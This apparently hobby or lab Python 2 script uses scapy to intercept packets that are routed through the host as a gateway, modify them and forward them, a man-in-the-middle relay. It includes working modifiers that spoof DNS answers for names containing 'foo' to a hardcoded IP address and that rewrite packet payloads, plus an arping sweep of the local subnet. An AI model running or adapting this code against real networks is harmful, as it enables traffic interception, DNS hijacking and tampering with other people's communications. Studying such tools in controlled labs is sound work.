from scapy.all import *

def getFilter():
    """Builds the libpcap filter expression
    
    We need to search for packets using us as a gateway.
    The 'gateway' primitive can't be used as it only takes hostnames as it's
    argument. Thus we are using the equivalent:
    
        ether dst host <localmac> and not dst host <localip>
    
    See pcap-filter(7) for details on the syntax of a pcap filter."""
    
    return "ether dst host %s and not dst host %s"%(
            get_if_hwaddr(scapy.main.conf.iface),
            get_if_addr(scapy.main.conf.iface))

def modifyDummy(packet):
    """Just returns the packet"""
    
    return packet

def startForwarding(iface=conf.iface, modify=modifyDummy):
    def callback(packet):
        if not isinstance(packet, Ether):
            packet.show()
            print "NOT AN ETHER PACKET"
            return
        packet = packet[1]
        #packet.show()
        print packet.summary()
        
        packet = modify(packet)
        if not packet:
            print "* Packet was dropped"
            return
        
        # fix checksums
        if isinstance(packet, IP):
            del packet.len
            del packet.chksum
            if isinstance(packet.payload, TCP):
                del packet[1].chksum
            if isinstance(packet.payload, UDP):
                del packet[1].len
                del packet[1].chksum
        """
        try:
            for i in xrange(0, 9001):
                if hasattr(packet[i], "chksum"):
                    del packet[i].chksum
                if hasattr(packet[i], "len"):
                    del packet[i].len
        except IndexError:
            pass
        """
        
        #print "Sending: %s"%repr(str(packet))
        send(packet, verbose=False)
    
    return sniff(iface=iface, store=0, filter=getFilter(), prn=callback)

def modifyDNSRedir(packet):
    if DNS in packet and packet.getlayer(DNS).an:
        if "foo" in packet.getlayer(DNS).qd.qname:
            packet.getlayer(DNS).an.rdata = "84.159.249.42"
    return packet

def modifyCaseswitch(packet):
    if Raw in packet:
        packet.getlayer(Raw).load = packet.getlayer(Raw).load.upper()
    return packet

def modify1337(packet):
    if Raw in packet:
        packet.getlayer(Raw).load = packet.getlayer(Raw).load.replace("e", "33")
    return packet

def arpTable():
    arping(re.sub(r"\d+$", "*", get_if_addr(scapy.main.conf.iface)))
